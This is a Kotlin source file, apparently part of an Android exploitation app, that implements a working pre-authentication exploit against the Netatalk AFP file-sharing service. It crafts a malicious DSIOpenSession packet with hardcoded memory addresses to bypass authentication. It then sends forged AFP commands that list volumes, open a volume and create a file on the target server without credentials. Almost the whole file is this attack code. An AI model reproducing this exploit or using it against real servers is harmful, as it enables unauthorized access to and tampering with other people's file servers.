package me.smoothhacker.swampsploit.exploit

import android.util.Log
import me.smoothhacker.swampsploit.utils.ExploitContext
import java.io.InputStream
import java.net.*
import java.util.*

@OptIn(ExperimentalUnsignedTypes::class)
class Netatalk constructor(
    private val ctx: ExploitContext,
    private val fileName: String = "PoC Demo",
) {
    private val tag = "Netatalk"
    val preauthSwitchAddress = ubyteArrayOf(0x40u, 0x31u, 0x65u, 0x0u, 0x0u, 0x0u, 0x0u, 0x0u) // 653140

    fun formatMalAFP(payload: UByteArray, address: UByteArray): UByteArray {
        val result = UByteArray(144)
        result[0] = 0x11u
        payload.copyInto(result, 2)
        address.copyInto(result, 136)
        return result
    }

    fun formatMalAFP(address: UByteArray): UByteArray {
        return formatMalAFP(ubyteArrayOf(), address)
    }

    @ExperimentalUnsignedTypes
    class DSI constructor(var flag: UByte, var command: UByte, var requestId: UShort, var payload: UByteArray = ubyteArrayOf()) {
        constructor(flag: Flag, command: Command, requestId: UShort, payload: UByteArray = ubyteArrayOf()) : this(flag.value, command.value, requestId, payload)

        companion object {
            fun build(stream: InputStream): DSI {
                val flag = stream.read().toUByte()
                val command = stream.read().toUByte()
                val requestId = stream.read().toUByte().toUShort().rotateLeft(8).or(stream.read().toUByte().toUShort())
                for (i in 0 until 4) stream.read()
                var datasize: UInt = 0u
                for (i in 0 until 4) {
                    datasize = datasize.rotateLeft(8)
                    datasize = datasize.or(stream.read().toUByte().toUInt())
                }
                for (i in 0 until 4) stream.read()
                val payload = UByteArray(datasize.toInt())
                for (i in payload.indices) {
                    payload[i] = stream.read().toUByte()
                }
                return DSI(flag, command, requestId, payload)
            }
        }

        enum class Flag constructor(val value: UByte) {
            Request(0u),
            Reply(1u)
        }

        enum class Command constructor(val value: UByte) {
            DSICloseSession(1u),
            DSICommand(2u),
            DSIGetStatus(3u),
            DSIOpenSession(4u),
            DSITickle(5u),
            DSIWrite(6u),
            DSIAttention(8u)
        }

        val packet: UByteArray
            get() {
                val result = UByteArray(16 + payload.size)

                result[0] = flag
                result[1] = command
                result[2] = requestId.rotateRight(8).toUByte()
                result[3] = requestId.toUByte()

                val size = payload.size.toUInt()
                for (i in 0 until 4) {
                    result[11 - i] = size.rotateLeft(i * 8).toUByte()
                }

                payload.copyInto(result, 16)
                return result
            }

        override fun toString(): String {
            return String(packet.toByteArray(), Charsets.UTF_8)
        }

    }

    fun connect(): Socket {
        val client = Socket()
        client.soTimeout = ctx.getTimeout().toInt()

        try {
            client.connect(InetSocketAddress(ctx.getHost(), ctx.getPort().toInt()), ctx.getTimeout().toInt())
        } catch (e: Exception) {
            throw Exception("Failed to establish connection.")
        }

        return client
    }

    fun initialize(client: Socket, requestId: UShort = 1u): DSI {
        try {
            val input = client.getInputStream()
            val output = client.getOutputStream()

            // initial exploit
            val exploit = UByteArray(18 + preauthSwitchAddress.size)
            ubyteArrayOf(
                0x1u, (exploit.size - 2).toUByte(),
                0x0u, 0x0u, 0x40u, 0x0u,
                0x0u, 0x0u, 0x0u, 0x0u,
                0xefu, 0xbeu, 0xadu, 0xdeu, // deadbeef
                0xceu, 0xfau, 0xedu, 0xfeu, // feedface
            ).copyInto(exploit)
            preauthSwitchAddress.copyInto(exploit, 18)

            val dsi = DSI(DSI.Flag.Request, DSI.Command.DSIOpenSession, requestId, exploit)
            output.write(dsi.packet.toByteArray())

            return DSI.build(input)
        } catch (e: Exception) {
            throw Exception("Exploit initialization failed.")
        }
    }

    fun listVolumes(client: Socket, requestId: UShort): DSI {
        try {
            val input = client.getInputStream()
            val output = client.getOutputStream()
            val listVolumes = formatMalAFP(ubyteArrayOf(0xf3u, 0xdfu, 0x43u, 0x0u, 0x0u, 0x0u, 0x0u, 0x0u)) // 43dff3

            output.write(DSI(DSI.Flag.Request, DSI.Command.DSICommand, requestId, listVolumes).packet.toByteArray())

            // response can be used for writing to volume
            return DSI.build(input)
        } catch (e: Exception) {
            throw Exception("Failed to list volumes.")
        }
    }

    fun listVolumes(dsi: DSI): List<String> {
        val result = ArrayList<String>()
        try {
            val count = dsi.payload[4]
            // converting to UInt then Int ensures that 'count' will not be interpreted as negative
            var data = dsi.payload.copyOfRange(5, dsi.payload.size)
            for (i in 0 until count.toUInt().toInt()) {
                val len = data[0].toUShort().rotateLeft(8).or(data[1].toUShort()).toUInt().toInt()
                val name = data.copyOfRange(2, 2 + len)
                result.add(name.toByteArray().toString(Charsets.UTF_8))
                data = data.copyOfRange(2 + len, data.size)
            }
        } catch (e: Exception) {
            throw Exception("Failed to list volumes.")
        }
        return result
    }

    fun listVolumeContent(client: Socket, requestId: UShort, volumeId: UShort): DSI {
        try {
            val input = client.getInputStream()
            val output = client.getOutputStream()
            
            val payload = ubyteArrayOf(
                volumeId.rotateRight(8).toUByte(), volumeId.toUByte(), 0x00u, 0x00u,
                0x00u, 0x02u, 0x01u, 0x40u,
                0x01u, 0x40u, 0x07u, 0xffu,
                0x00u, 0x00u, 0x00u, 0x01u,
                0x7fu, 0xffu, 0xffu, 0xffu,
                0x02u, 0x00u, 0x00u, 0x00u
            )
            
            val listVolumes = formatMalAFP(payload, ubyteArrayOf(0x4fu, 0x11u, 0x42u, 0x0u, 0x0u, 0x0u, 0x0u, 0x0u)) // 42114f

            output.write(DSI(DSI.Flag.Request, DSI.Command.DSICommand, requestId, listVolumes).packet.toByteArray())

            // response can be used for listing volumes
            return DSI.build(input)
        } catch (e: Exception) {
            throw Exception("Failed to list volumes.")
        }
    }

    fun listVolumeContent(dsi: DSI): List<String> {
        val result = ArrayList<String>()
        try {
            val count = dsi.payload[4].toUShort().rotateLeft(8).or(dsi.payload[5].toUShort())
            // converting to UInt then Int ensures that 'count' will not be interpreted as negative
            var data = dsi.payload.copyOfRange(6, dsi.payload.size)
            for (i in 0 until count.toUInt().toInt()) {
                val len = data[8].toUShort().rotateLeft(8).or(data[1].toUShort()).toUInt().toInt()
                val directory = data[2] > 0u
                var end = len;
                // names are padded with null bytes for alignment
                while (data[end - 1] == (0x0u).toUByte()) end--
                var name = data.copyOfRange(11, end).toByteArray().toString(Charsets.UTF_8)
                if (directory) name += "/"
                Log.w(tag, "name: $name")//192.168.47.138
                result.add(name)
                data = data.copyOfRange(len, data.size)
            }
        } catch (e: Exception) {
            throw Exception("Failed to list volumes.")
        }
        return result
    }

    fun openVolume(client: Socket, requestId: UShort, name: String): DSI {
        try {
            val input = client.getInputStream()
            val output = client.getOutputStream()

            name.toByteArray().toUByteArray()
            // open volume
            val payload = UByteArray(3 + name.length)
            ubyteArrayOf(0x0u, 0x20u, name.length.toUByte()).copyInto(payload)
            name.toByteArray().toUByteArray().copyInto(payload, 3)
            val openVolume = formatMalAFP(payload, ubyteArrayOf(0xa6u, 0xe8u, 0x43u, 0x0u, 0x0u, 0x0u, 0x0u, 0x0u))

            output.write(DSI(DSI.Flag.Request, DSI.Command.DSICommand, requestId, openVolume).packet.toByteArray())

            // response is used for writing to volume
            return DSI.build(input)
        } catch (e: Exception) {
            throw Exception("Failed to open volume \"$name\".")
        }
    }

    fun createFile(client: Socket, requestId: UShort, volumeId: UShort, name: String): DSI {
        try {
            val input = client.getInputStream()
            val output = client.getOutputStream()

            val cfp = UByteArray(8 + name.length)
            cfp[0] = volumeId.rotateRight(8).toUByte()
            cfp[1] = volumeId.toUByte()
            ubyteArrayOf(0x2u, 0x2u, name.length.toUByte()).copyInto(cfp, 5)
            name.toByteArray().toUByteArray().copyInto(cfp, 8)
            println(cfp.toByteArray().contentToString())
            val createFile = formatMalAFP(cfp, ubyteArrayOf(0xfcu, 0x5eu, 0x42u, 0x0u, 0x0u, 0x0u, 0x0u, 0x0u))

            output.write(DSI(DSI.Flag.Request, DSI.Command.DSICommand, requestId, createFile).packet.toByteArray())

            return DSI.build(input)
        } catch (e: Exception) {
            throw Exception("Failed to create file \"$name\".")
        }
    }

    fun createFile(name: String, fileName: String): Boolean {
        var response: DSI

        try {
            val client = connect()
            var requestId: UShort = 1u
            initialize(client, requestId++)

            response = openVolume(client, requestId++, name)

            val volumeId: UShort = response.payload[2].toUShort().rotateLeft(8).or(response.payload[3].toUShort())

            createFile(client, requestId, volumeId, fileName)
        } catch (exception: Exception) {
            exception.message?.let { Log.w(tag, it) }
            return false
        }

        return true
    }

    fun listVolumes(): Boolean {
        try {
            val client = connect()
            var requestId: UShort = 1u
            initialize(client, requestId++)
            val names = listVolumes(listVolumes(client, requestId))
            for (name in names) {
                // TODO: Make volume names available to user
                Log.w(tag, "Volume Name: $name")
            }
        } catch (exception: Exception) {
            exception.message?.let { Log.w(tag, it) }
            return false
        }

        return true
    }

     fun exploit(): Boolean {
         return createFile("My AFP Volume", fileName)
     }
}
